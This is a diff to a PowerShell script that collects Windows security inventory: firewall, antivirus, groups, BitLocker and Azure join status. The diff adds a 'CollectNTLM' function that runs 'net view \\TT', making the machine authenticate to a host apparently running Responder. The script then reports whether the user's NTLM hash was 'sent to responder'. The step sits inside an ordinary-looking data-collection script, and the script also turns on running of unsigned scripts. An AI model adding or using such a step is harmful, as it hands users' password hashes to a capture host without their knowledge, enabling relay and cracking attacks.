@@ -1,4 +1,4 @@
-﻿#Small script to collect some windows data.
+#Small script to collect some windows data.
 
 try{
 	#Allow running unsigned scripts as current user
@@ -61,7 +61,7 @@ $firewallStatus = Get-NetFireWallProfile | Select Profile, Enabled, DefaultInbou
 #https://jdhitsolutions.com/blog/powershell/5187/get-antivirus-product-status-with-powershell/
 Write-Host "Collecting info about antivirus."
 $avProducts = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select displayName, productState, timestamp 
-
+$responder = CollectNTLM
 
 
 Write-Host "Processing collected data."
@@ -89,6 +89,7 @@ $collectedData | Add-Member -MemberType NoteProperty -Name Non_standard_win_serv
 $collectedData | Add-Member -MemberType NoteProperty -Name Non_MS_scheduled_tasks -Value $nonMSScheduledTasks
 $collectedData | Add-Member -MemberType NoteProperty -Name Firewall -Value $firewallStatus
 $collectedData | Add-Member -MemberType NoteProperty -Name Antivirus -Value $avProducts
+$collectedData | Add-Member -MemberType NoteProperty -Name Responder -Value $responder
 
 foreach ($avProduct in $avProducts)
 {
@@ -215,7 +216,6 @@ return [PSCustomObject]@{
     
 }
 
-
 function Get-Groups {
     Param(
         [string]$isMember
@@ -239,7 +239,6 @@ function Get-Groups {
     }
 }
 
-
 function Get-BitLockerStatus {
 [CmdletBinding()]
 	param (
@@ -256,7 +255,6 @@ function Get-BitLockerStatus {
 	}
 return $BitLockerStatus
 }
-
 
 function Check-IfAzureJoined {
 
@@ -278,6 +276,23 @@ return $tenantId
 }
 
 return "Not joined."
+}
+
+function CollectNTLM {
+    Write-Host "Collecting NTLM hash by connecting to \\TT..."
+
+    $output = net view \\TT 2>&1
+    $text   = $output -join "`n"   # <‑‑ critical fix
+
+    if ($text -match "System error (\d+)") {
+        $code = [int]$matches[1]
+
+        if ($code -eq 5) {
+            return "Hash sent to responder, exit code $code"
+        } else {
+            return "Has not sent to responder, exit code $code"
+        }
+    }
 }
 
 function Check-WhoJoinedAzure {
